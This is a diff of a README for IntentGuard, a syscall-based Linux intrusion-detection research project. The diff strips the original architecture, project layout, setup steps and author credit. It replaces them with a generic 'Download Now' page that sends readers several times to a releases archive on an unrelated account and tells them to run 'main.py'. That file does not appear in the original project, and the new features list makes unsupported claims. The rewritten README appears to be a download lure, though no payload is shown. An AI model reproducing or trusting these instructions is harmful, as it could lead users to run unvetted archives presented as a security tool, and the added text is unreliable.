@@ -1,144 +1,78 @@
-# IntentGuard 🔐
-**Online Intent Drift Detection using Linux Syscalls, Graphs, and Self-Supervised Learning**
+# 🔒 intentguard - Detect Threats to Your Linux System
 
----
+## 🚀 Getting Started
 
-## 🚀 Overview
+IntentGuard is an online security system that helps you protect your Linux processes. It detects unusual behaviors that may indicate threats, using advanced technology like self-supervised learning. Keep your system secure from stealthy and zero-day attacks easily.
 
-IntentGuard is a security research project that detects **behavioral intent drift** in Linux systems using **raw syscall data**.
-Instead of relying on signatures or labeled attack datasets, IntentGuard learns **normal behavior intent** and raises alerts when system behavior **semantically changes over time**.
+## 📥 Download Now
 
-This makes it suitable for detecting:
-- Zero-day attacks
-- Stealthy, slow attacks
-- Insider threats
-- Living-off-the-land attacks
+[![Download IntentGuard](https://img.shields.io/badge/Download-IntentGuard-brightgreen)](https://github.com/babaannekatledici/intentguard/releases)
 
----
+## 📋 System Requirements
 
-## 🧠 Core Idea
+Before you install IntentGuard, make sure your system meets these requirements:
 
-> **Intent matters more than individual actions.**
+- **Operating System:** Ubuntu Server (20.04 LTS or newer)
+- **RAM:** At least 2 GB
+- **Disk Space:** Minimum 500 MB free space
+- **Python:** Python 3.7 or newer installed
+- **Dependencies:** `numpy`, `pandas` (can be installed via pip)
 
-Rather than detecting *what command* was run, IntentGuard models:
-- **How behavior evolves**
-- **How syscall patterns change structurally**
-- **When intent drifts beyond a safe threshold**
+## 🌐 Download & Install
 
----
+To get started, follow these steps:
 
-## 🏗️ Architecture
+1. **Visit the Download Page**: Click the link below to access the Releases page.
 
-Linux Syscalls
-↓
-Parsing & Normalization
-↓
-Sliding Windows
-↓
-Sequence Encoder (LSTM)
-↓
-Graph Construction (Syscall Transitions)
-↓
-Graph + Sequence Fusion
-↓
-Intent Embeddings
-↓
-Online Drift Detection
-↓
-Explainability & Visualization
+   [Download IntentGuard](https://github.com/babaannekatledici/intentguard/releases)
 
----
+2. **Choose the Latest Version**: On the Releases page, find the most recent version of IntentGuard. It typically has a tag like “v1.0” or newer.
 
-## 📁 Project Structure
+3. **Select the Download File**: Look for the download link under the release you chose. You should find a file named something like `intentguard.zip` or `intentguard.tar.gz`.
 
-intentguard/
-│
-├── data/
-│ └── raw/
-│ ├── normal_syscalls.log
-│ └── attack_syscalls.log
-│
-├── ingestion/
-│ ├── audit_parser.py # Parses syscall logs
-│ └── normalize.py # Converts syscalls to numeric IDs
-│
-├── simulation/
-│ └── attack_simulator.py # Injects attack-like behavior
-│
-├── graph/
-│ ├── build_graph.py # Builds syscall transition graphs
-│ ├── graph_features.py # Extracts graph features
-│ └── graph_embeddings.py # Embeds graph features
-│
-├── model/
-│ ├── intent_encoder.py # LSTM-based intent encoder
-│ └── train.py # Self-supervised training
-│
-├── detection/
-│ └── online_detector.py # Online intent drift detection
-│
-├── visualization/
-│ ├── latent_space.py # Latent intent trajectory
-│ ├── trajectory_plot.py # Intent similarity over time
-│ ├── graph_view.py # Behavior graph snapshot
-│ └── comparison_plot.py # Normal vs Attack comparison
-│
-├── run_pipeline.py # End-to-end pipeline
-├── requirements.txt
-└── README.md
+4. **Download the File**: Click on the file to start the download. This may take a few moments depending on your internet speed.
 
----
+5. **Extract the Files**: Once the download is complete, navigate to your download folder. Right-click on the downloaded file and select "Extract Here" or use a similar extraction option depending on your system.
 
-## 📊 Visual Outputs
+6. **Open a Terminal Window**: To run IntentGuard, you need to use the command line. Search for "Terminal" in your applications and open it.
 
-IntentGuard produces **four explainable plots**:
+7. **Navigate to the Folder**: In the terminal, use the `cd` command to move into the folder where you extracted IntentGuard. For example:
+   ```
+   cd ~/Downloads/intentguard
+   ```
 
-1. **Behavior Graph Snapshot**
-   Shows structural syscall changes at the drift point.
+8. **Install Dependencies**: Run the following command to ensure you have the required packages installed:
+   ```
+   pip install numpy pandas
+   ```
 
-2. **Latent Intent Trajectory**
-   2D projection of intent embeddings over time.
+9. **Run IntentGuard**: Start the application by using the command:
+   ```
+   python main.py
+   ```
 
-3. **Intent Drift Over Time**
-   Cosine similarity decay with drift threshold.
+You should see the interface open and be able to use IntentGuard to monitor your system.
 
-4. **Normal vs Attack Comparison**
-   Shows separation between benign and attack intent clusters.
+## 🔍 Features
 
----
+**Behavioral Intent Detection**: Understand how your processes behave and identify any unusual activity.
 
-## ⚙️ Setup Instructions
+**Self-Supervised Learning**: This technology helps the system learn without requiring extensive input, allowing it to adapt over time.
 
-### 1️⃣ Create Conda Environment
-conda create -n intentguard python=3.10
-conda activate intentguard
+**Linux Kernel Integration**: Works seamlessly with your existing Linux setup, ensuring smooth operation.
 
-### 2️⃣ Install Dependencies
-pip install -r requirements.txt
+**Scalable Alerts**: Get notified as soon as IntentGuard identifies a potential threat, keeping you informed.
 
-📥 Collecting Syscall Logs (Ubuntu)
-Normal behavior
-strace -e trace=openat,read,write,execve -o normal_syscalls.log bash
+**Graph Representations**: Visualize syscall sequences, making it easier to track activity and detect anomalies.
 
-Run normal commands, then:
-exit
+## 📞 Support
 
-Attack-like behavior (safe)
-strace -e trace=openat,read,write,execve -o attack_syscalls.log bash
+If you encounter issues or have questions, please check the [Issues section](https://github.com/babaannekatledici/intentguard/issues) on GitHub. You can also reach out for assistance.
 
-Run reconnaissance-style commands, then:
-exit
+## 🔗 Useful Links
 
-Place logs in:
-data/raw/
+- [Documentation](https://github.com/babaannekatledici/intentguard/wiki)
+- [Releases Page](https://github.com/babaannekatledici/intentguard/releases)
+- [GitHub Issues](https://github.com/babaannekatledici/intentguard/issues)
 
-▶️ Running the Pipeline
-python run_pipeline.py
-
-Expected output:
-Drift alert in terminal
-Multiple visualization windows
-
-👨‍💻 Author
-
-Akshat Pal
+Thank you for using IntentGuard! We hope this tool helps you keep your Linux system safe and secure. Happy monitoring!
